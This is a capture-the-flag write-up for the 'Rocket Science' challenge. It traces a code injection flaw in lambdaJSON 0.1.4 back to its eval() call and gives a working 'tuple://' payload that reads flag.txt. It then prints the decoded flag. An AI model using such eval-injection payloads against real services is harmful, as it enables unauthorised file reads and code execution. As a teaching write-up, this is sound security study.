---
description: Code injection vulnerability in lambdaJSON
---

# Rocket Science

## Description

Welcome to Rocket Science! In this class, we will learn all about rockets. But first, let's revise your numbers!

`nc 20.198.209.142 55020`

_The flag is in the flag format: STC{...}_

**Author: zeyu2001**

{% file src="../../.gitbook/assets/requirements.txt" %}
requirements.txt
{% endfile %}

{% file src="../../.gitbook/assets/rocket_science.py" %}
rocket_science.py
{% endfile %}

## Solution

The requirements file contains only a single dependency.

```
lambdajson == 0.1.4
```

Let's take a look at the part of the source code in which this is used.

```python
elif ipt == '3':
	
		print("Enter saved numbers:")
		
		try:
			numbers = lj.deserialize(input('> '))
			
			if type(numbers) == tuple and all(type(x) == int for x in numbers):
				print(numbers)
				
			else:
				print("Don't you know what numbers are?")
			
		except:
			print("Invalid input!")
```

We can see that `lj.deserialize()` is called directly on the user input.

It's always a good idea to check dependencies for vulnerabilities, so let's go to the [PyPi page](https://pypi.org/project/lambdaJSON/) for lambdaJSON. If version 0.1.4 is vulnerable, then we should expect later versions to issue security fixes. 

On the [release notes](https://pypi.org/project/lambdaJSON/0.1.5/) from version 0.1.5, we find our vulnerability.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 4.00.39 PM.png>)

Under the "Changes from previous" section:

> Security fix. Using ast.literal_eval as eval.

From the release history, we can find out when this fix was released.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 4.03.52 PM.png>)

This allows us to find the [GitHub commit](https://github.com/pouya-eghbali/lambdaJSON/commit/0d3bcb8bf3388c90819f0f24c9865bc8d4d8b91e) for this fix.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 4.05.24 PM.png>)

Great! We have found the source code for the vulnerable version of the package. In the [source code](https://github.com/pouya-eghbali/lambdaJSON/blob/05d8d92916cdb9df20b83265c6ccd38d6b29d52b/lambdaJSON.py), we find that the `restore()` function used by `deserialize()` uses `eval()`!

```python
restore = lambda obj:          (isinstance(obj, str) 
                        and    (lambda x: x.startswith('bytes://') 
                        and    bytes(x[8:], encoding = 'utf8') 
                        or     x.startswith('int://') 
                        and    int(x[6:]) 
                        or     x.startswith('float://') 
                        and    float(x[8:])
                        or     x.startswith('long://') 
                        and    long(x[7:])
                        or     x.startswith('bool://') 
                        and    eval(x[7:]) 
                        or     x.startswith('complex://')
                        and    complex(x[10:])
                        or     x.startswith('tuple://') 
                        and    eval(x[8:]) or x)(obj) 
                        or     isinstance(obj, list) 
                        and    [restore(i) for i in obj] 
                        or     isinstance(obj, dict) 
                        and    {restore(i):restore(obj[i]) for i in obj} 
                        or     obj)

...

deserialize = lambda obj: restore(json.loads(obj))
```

Note that the deserialized output must be a tuple of integers.

```python
if type(numbers) == tuple and all(type(x) == int for x in numbers):
				print(numbers)
```

The vulnerable version of `deserialize()` will strip the starting `tuple://` and `eval()` the rest of the input string.

So, if we use the following payload:

```
"tuple://(int.from_bytes(open('flag.txt').read().encode(), byteorder='big'), 2)"
```

we will get the integer representation of the flag.

![](<../../.gitbook/assets/Screenshot 2021-07-24 at 4.16.35 PM.png>)

The flag is `STC{3v4l_1s_3v1l_00e80002e832f357cf5c05ee114a5cb40e746757}`

```
➜  ~ python3
Python 3.9.5 (default, May  4 2021, 03:36:27)
[Clang 12.0.0 (clang-1200.0.32.29)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> long_to_bytes(3969309506657081582967368110556498469050796930805813227720771571473136717745745293677237528859886779701434271164439572744813346302117987974410)
b'STC{3v4l_1s_3v1l_00e80002e832f357cf5c05ee114a5cb40e746757}\n'
>>>
```
